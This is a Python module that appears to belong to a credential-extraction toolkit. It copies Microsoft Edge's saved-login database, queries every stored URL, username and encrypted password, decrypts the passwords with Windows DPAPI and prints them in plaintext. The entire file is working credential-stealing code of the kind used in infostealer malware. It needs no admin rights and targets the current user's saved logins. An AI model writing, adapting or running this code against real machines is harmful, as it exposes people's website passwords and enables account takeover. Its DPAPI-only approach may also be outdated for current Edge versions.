#!/usr/bin/env python3
"""
Microsoft Edge Password Decryptor
Extract and decrypt Edge saved passwords using DPAPI
"""

import os
import sqlite3
import shutil
from pathlib import Path
from typing import List, Dict

from ..utils import dpapi_decrypt_string, is_dpapi_available


class EdgeDecryptor:
    """
    Decrypt Microsoft Edge saved passwords
    
    Location: %LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data
    Encryption: DPAPI (user context)
    Note: Edge is Chromium-based, uses same format as Chrome
    """
    
    DECRYPTOR_NAME = "edge"
    REQUIRES_ADMIN = False
    
    def __init__(self, output_dir: Path):
        self.output_dir = Path(output_dir)
        self.edge_path = os.path.expandvars(
            r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data'
        )
    
    def decrypt(self) -> List[Dict]:
        """
        Decrypt Edge passwords
        
        Returns:
            List of credential dictionaries
        """
        print(f"\n[*] Decrypting Microsoft Edge passwords...")
        print(f"[*] Database: {self.edge_path}")
        
        credentials = []
        
        # Check if DPAPI is available
        if not is_dpapi_available():
            print(f"[-] pywin32 not installed")
            print(f"[!] Install: pip install pywin32")
            return credentials
        
        # Check if Edge database exists
        if not os.path.exists(self.edge_path):
            print(f"[-] Edge password database not found")
            print(f"[!] Edge may not be installed or no passwords saved")
            return credentials
        
        try:
            # Copy database (Edge locks it while running)
            temp_db = self.output_dir / "edge_temp.db"
            shutil.copy2(self.edge_path, temp_db)
            
            print(f"[+] Edge database copied")
            
            # Connect to database
            conn = sqlite3.connect(str(temp_db))
            cursor = conn.cursor()
            
            # Query saved passwords
            cursor.execute(
                "SELECT origin_url, username_value, password_value FROM logins"
            )
            
            rows = cursor.fetchall()
            
            if not rows:
                print(f"[-] No saved passwords found in Edge")
                conn.close()
                temp_db.unlink()
                return credentials
            
            print(f"[+] Found {len(rows)} saved password(s)")
            
            # Decrypt each password
            for url, username, encrypted_password in rows:
                if not encrypted_password:
                    continue
                
                try:
                    # Decrypt using DPAPI
                    decrypted_password = dpapi_decrypt_string(encrypted_password)
                    
                    if decrypted_password:
                        cred = {
                            'source': 'Edge',
                            'url': url,
                            'username': username,
                            'password': decrypted_password
                        }
                        
                        credentials.append(cred)
                        
                        print(f"[+] Decrypted credential:")
                        print(f"    URL: {url}")
                        print(f"    Username: {username}")
                        print(f"    Password: {decrypted_password}")
                    else:
                        print(f"[-] Failed to decrypt password for {url}")
                
                except Exception as e:
                    print(f"[-] Error decrypting {url}: {e}")
            
            # Cleanup
            conn.close()
            temp_db.unlink()
            
            print(f"\n[+] Successfully decrypted {len(credentials)} Edge password(s)")
        
        except sqlite3.Error as e:
            print(f"[-] Database error: {e}")
        
        except Exception as e:
            print(f"[-] Edge decryption failed: {e}")
        
        return credentials
    
    def is_available(self) -> bool:
        """Check if Edge database exists"""
        return os.path.exists(self.edge_path) and is_dpapi_available()
    
    @staticmethod
    def get_info() -> Dict:
        """Get information about this decryptor"""
        return {
            'name': 'edge',
            'description': 'Decrypt Microsoft Edge saved passwords',
            'requires_admin': False,
            'location': r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data',
            'encryption': 'DPAPI (user context)',
            'credential_types': ['website credentials'],
            'notes': [
                'Decrypts passwords saved in Microsoft Edge',
                'Requires same user context as Edge',
                'Database must be copied (locked while Edge running)',
                'Uses Windows DPAPI for decryption',
                'Chromium-based, same format as Chrome'
            ],
            'requirements': [
                'pywin32 package',
                'Microsoft Edge installed',
                'Saved passwords in Edge'
            ]
        }
